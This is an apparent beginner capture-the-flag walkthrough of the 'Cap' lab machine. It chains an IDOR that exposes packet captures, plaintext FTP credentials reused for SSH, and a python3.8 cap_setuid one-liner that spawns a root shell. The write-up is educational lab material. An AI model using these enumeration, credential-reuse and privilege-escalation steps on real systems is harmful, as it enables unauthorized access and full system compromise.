Cap

Full walkthrough of Cap covering IDOR exploitation, PCAP analysis, credential reuse, and Linux capability-based privilege escalation.

01 — Introduction

Cap is an easy Linux machine that is perfect for beginners. It introduces two important concepts:

  • IDOR (Broken Access Control)
  • Linux Capabilities (Privilege Escalation)
ℹ
This is an excellent first box for learning real-world attack chains.

The target IP is:

10.10.10.245

02 — Enumeration

We start with two Nmap scans: 

nmap -p- -T4 10.10.10.245
nmap -p21,22,80 -A -T4 10.10.10.245

This method is faster than running a full aggressive scan immediately. 

21 → FTP
22 → SSH
80 → HTTP (Gunicorn)
Gunicorn is a Python WSGI server ("Green Unicorn") used to serve web applications.

03 — Website Analysis

The website is a security dashboard showing network captures.

While browsing, we find downloadable PCAP files: 

/data/1

Changing the ID: 

/data/0
This is an IDOR vulnerability (Insecure Direct Object Reference).

IDOR allows access to unauthorized data by modifying identifiers.

04 — PCAP Analysis

A PCAP (Packet Capture) file contains network traffic.

Using Wireshark, we inspect the capture and find: 

Username: nathan
Password: Buck3tH4TF0RM3!
FTP sends credentials in plaintext → easily captured.

05 — Foothold

Using credentials: 

ftp 10.10.10.245
ssh nathan@10.10.10.245

We gain access and retrieve user flag. 

cat user.txt

06 — Privilege Escalation

Check capabilities: 

getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid

Capabilities are granular permissions similar to SUID.

cap_setuid allows changing user ID → root escalation.

Exploit:

python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Root access achieved.

cat /root/root.txt

07 — Conclusion

This machine demonstrates a full attack chain:

  • IDOR → Data Exposure
  • PCAP → Credentials
  • SSH → Foothold
  • Capabilities → Root
Great beginner-friendly machine with real-world concepts.
